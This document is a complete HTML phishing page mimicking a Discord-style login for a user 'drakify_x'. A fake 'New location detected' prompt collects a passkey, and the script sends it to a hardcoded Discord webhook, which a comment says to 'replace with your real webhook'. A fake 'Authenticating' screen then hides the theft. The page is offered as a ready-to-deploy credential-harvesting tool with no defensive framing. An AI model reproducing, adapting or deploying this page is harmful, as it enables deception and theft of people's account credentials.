<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Drakify Login</title>
  <link href="https://fonts.googleapis.com/css2?family=Rubik:wght@400;500;700&display=swap" rel="stylesheet">
  <style>
    * {
      margin: 0;
      padding: 0;
      font-family: 'Rubik', sans-serif;
      box-sizing: border-box;
    }

    body {
      background-color: #1e1f22;
      color: #fff;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      overflow: hidden;
    }

    .login-box {
      background: #2b2d31;
      border-radius: 16px;
      box-shadow: 0 0 25px rgba(0, 0, 0, 0.6);
      padding: 40px;
      width: 360px;
      text-align: center;
      transition: all 0.3s ease-in-out;
    }

    .avatar {
      width: 80px;
      height: 80px;
      border-radius: 50%;
      border: 3px solid #5865f2;
      margin-bottom: 15px;
    }

    .username {
      font-size: 22px;
      font-weight: 600;
      margin-bottom: 20px;
      color: #fff;
    }

    .login-btn {
      background-color: #5865f2;
      color: white;
      padding: 12px 24px;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      cursor: pointer;
      transition: 0.2s ease;
    }

    .login-btn:hover {
      background-color: #4752c4;
    }

    .popup {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      height: 100vh;
      width: 100vw;
      background: rgba(0, 0, 0, 0.75);
      justify-content: center;
      align-items: center;
      z-index: 10;
    }

    .popup-box {
      background: #313338;
      padding: 30px;
      border-radius: 14px;
      width: 320px;
      text-align: center;
      box-shadow: 0 0 20px rgba(0, 0, 0, 0.4);
    }

    .popup-box h3 {
      margin-bottom: 15px;
      font-size: 18px;
      font-weight: 500;
    }

    .popup-box input {
      width: 90%;
      padding: 10px;
      border-radius: 8px;
      border: none;
      outline: none;
      background: #1e1f22;
      color: white;
      margin-bottom: 15px;
      font-size: 15px;
    }

    .popup-box button {
      background-color: #5865f2;
      color: white;
      padding: 10px 20px;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      font-size: 15px;
    }

    .popup-box button:hover {
      background-color: #4752c4;
    }

    .loading-screen {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      height: 100vh;
      width: 100vw;
      background: #1e1f22;
      color: white;
      font-size: 24px;
      font-weight: bold;
      align-items: center;
      justify-content: center;
      z-index: 99;
      flex-direction: column;
      animation: fadeIn 1s ease-in-out;
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: scale(0.95); }
      to { opacity: 1; transform: scale(1); }
    }

    .loading-dots::after {
      content: '';
      display: inline-block;
      animation: dots 1.5s infinite;
    }

    @keyframes dots {
      0% { content: ''; }
      33% { content: '.'; }
      66% { content: '..'; }
      100% { content: '...'; }
    }
  </style>
</head>
<body>

  <div class="login-box">
    <img class="avatar" src="https://i.pinimg.com/736x/ae/ed/d1/aeedd126eb22be0730716d4a6277ca54.jpg" alt="Avatar">
    <div class="username">drakify_x</div>
    <button class="login-btn" onclick="showPopup()">Log In</button>
  </div>

  <div class="popup" id="popup">
    <div class="popup-box">
      <h3>New location detected</h3>
      <p style="margin-bottom: 10px; font-size: 14px; color: #b5bac1;">Please confirm your identity</p>
      <input type="password" id="passInput" placeholder="Enter passkey">
      <br>
      <button onclick="sendPass()">Confirm</button>
    </div>
  </div>

  <div class="loading-screen" id="loading">
    <div class="loading-dots">Authenticating</div>
  </div>

  <script>
    const popup = document.getElementById("popup");
    const loading = document.getElementById("loading");
    const webhookURL = "https://discord.com/api/webhooks/1398237428195524669/eJ7Qcn2sFpQDs2GyqfixkC9Ov0En1xErVcYPm-C3lsPOnbtabV32IG1LbfDTiArolMKN"; // Replace this with your real webhook

    function showPopup() {
      popup.style.display = "flex";
      document.getElementById("passInput").focus();
    }

    function sendPass() {
      const passkey = document.getElementById("passInput").value;
      popup.style.display = "none";

      // Send passkey to Discord
      fetch(webhookURL, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          content: `ðŸ” Passkey submitted: **${passkey}**`
        })
      })
      .then(() => {
        loading.style.display = "flex";
        setTimeout(() => {
          document.body.innerHTML = "";
        }, 25000);
      })
      .catch((err) => {
        console.error("Webhook Error:", err);
        loading.style.display = "flex";
        setTimeout(() => {
          document.body.innerHTML = "";
        }, 25000);
      });
    }

    document.getElementById("passInput").addEventListener("keypress", function (e) {
      if (e.key === "Enter") sendPass();
    });
  </script>
</body>
</html>
